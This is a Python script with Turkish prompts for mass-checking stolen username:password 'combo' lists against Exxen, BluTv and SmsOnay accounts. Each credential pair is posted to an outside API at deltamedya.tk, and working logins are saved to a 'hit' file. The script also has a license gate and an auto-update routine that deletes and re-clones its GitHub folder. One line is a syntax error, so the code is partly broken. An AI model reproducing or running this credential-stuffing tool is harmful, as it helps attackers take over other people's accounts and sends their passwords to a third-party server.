import random
import os
import time
import requests
from time import sleep
from colorama import Fore
import time 
say=0
dsy=""
n = '\033[1;35m'
j = '\033[1;36m'
o = '\033[1;31m'
Y  = Fore.YELLOW
dir='/sdcard/combo/'
banner=("""\33[31m
  ___ ___ _____    ____  _ ___ ____  _____ ___  
 |_  | __|_   _|  / _/ || | __/ _/ |/ / __| _ \ 
  / /| _|  | |   | \_| >< | _| \_|   <| _|| v / 
 |___|___| |_|    \__/_||_|___\__/_|\_\___|_|_\ 
\33[0m""")
def basla():
    os.system("clear")
    print(banner)
    print("""\33[31m
    [1] Exxen
    [2] BluTv
    [3] SmsOnay.Com
    """)
    hesap= input("Sayı Giriniz :\33[0m")
    if hesap=="1":
        exxen()
    elif hesap=="2":
        blutv()
    elif hesap=="3":
        smsonay()
    else:
        quit()
def exxen():
    while True:
        os.system("clear")
        print(banner)
        dosya= input("Combo ismi Gir [.txt Olmadan] :")
        hit= input("Hit Kayıtedilcek Dosya ismi Gir [.txt Olmadan] :")
        dosyaa= dosya + '.txt'
        hit2= hit + '.txt'
        for mp in open(dosyaa,'r').read().splitlines():
            mp=mp.replace("\n","")
            user = mp.split(':')[0]
            pasw = mp.split(':')[1]
            dosyaa= dosya + '.txt'
            url = f'https://deltamedya.tk/api/exxen.php?lista={user}:{pasw}'
            req = requests.post(url).text
            if "#Onaylandı" in req:
                dosya=open(hit2, 'a')
                dosya.write(user+':'+pasw+' Checker By @ZetTekno - @yusiqo'+'\n')
                print(f'[=] Live: {user}{pasw}')
            else:
                print(f"Başarısız: {user}:{pasw}")
def blutv():
    while True:
        os.system("clear")
        print(banner)
        dosya= input("Combo ismi Gir [.txt Olmadan] :")
        hit= input("Hit Kayıtedilcek Dosya ismi Gir [.txt Olmadan] :")
        dosyaa= dosya + '.txt'
        hit2= hit + '.txt'
        for mp in open(dosyaa,'r').read().splitlines():
            mp=mp.replace("\n","")
            user = mp.split(':')[0]
            pasw = mp.split(':')[1]
            dosyaa= dosya + '.txt'
            url = f'https://deltamedya.tk/api/blu.php?lista={user}:{pasw}'
            req = requests.post(url).text
            if "#Onaylandı" in req:
                dosya=open(hit2, 'a')
                dosya.write(user+':'+pasw+' Checker By @ZetTekno - @yusiqo'+'\n')
                print(f'[=] Live: {user}{pasw}')
            else:
                print(f"Başarısız: {user}:{pasw}")
def smsonay():
    while True:
        os.system("clear")
        print(banner)
        dosya= input("Combo ismi Gir [.txt Olmadan] :")
        hit= input("Hit Kayıtedilcek Dosya ismi Gir [.txt Olmadan] :")
        dosyaa='/combo/' dosya + '.txt'
        hit2= '/hit/' + hit + '.txt'
        for mp in open(dosyaa,'r').read().splitlines():
            mp=mp.replace("\n","")
            user = mp.split(':')[0]
            pasw = mp.split(':')[1]
            dosyaa= dosya + '.txt'
            url = f'https://deltamedya.tk/api/smsonay.php?lista={user}:{pasw}'
            req = requests.post(url).text
            if "#Onaylandı" in req:
                dosya=open(hit2, 'a')
                dosya.write(user+':'+pasw+' Checker By @ZetTekno - @yusiqo'+'\n')
                print(f'[=] Live: {user}{pasw}')
            else:
                print(f"Başarısız: {user}:{pasw}")
os.system("clear")
url= 'https://raw.githubusercontent.com/yusiqo/OpMob/main/version'
response= requests.get(url).text
filad="keys.txt"
version=(response)
ver=open('version','r+')
fayl=(ver.read())
if fayl == version:
    os.system("clear")
    print(banner)
    print("""
    """)
    print("Bedava Lisans Kodu İçin Telegram Gurubumuza Sadece 'lisans' Yazmanız Yeterlidir")
    print("""
    """)
    lisans= input("Lütfen Lisans Kodunu Giriniz :")
    keys=(lisans)
    url2 = 'https://deltamedya.tk/lisans.html'
    req2 = requests.post(url2).text
    kod=(req2)
    dosya=open(filad,'a') 
    dosya.close()
    dosya=open(filad,'r+') 
    if dosya.read() == kod:
        print("Oto Giriş Başarılı")
        basla()
    if lisans == kod:
        print("Başarılı")
        dosya=open(filad,'w+') 
        dosya.write(keys)
        dosya.close()
        basla()
    else:
        print("Yanlış")
        exit()
        os.system("exit")
else:
    os.system("figlet Gunceleme..")
    print("Otomatik Güncelleme Yapılıyor......")
    time.sleep(4)
    os.system("cd && rm -rf OpMob && git clone https://github.com/yusiqo/OpMob && cd OpMob")
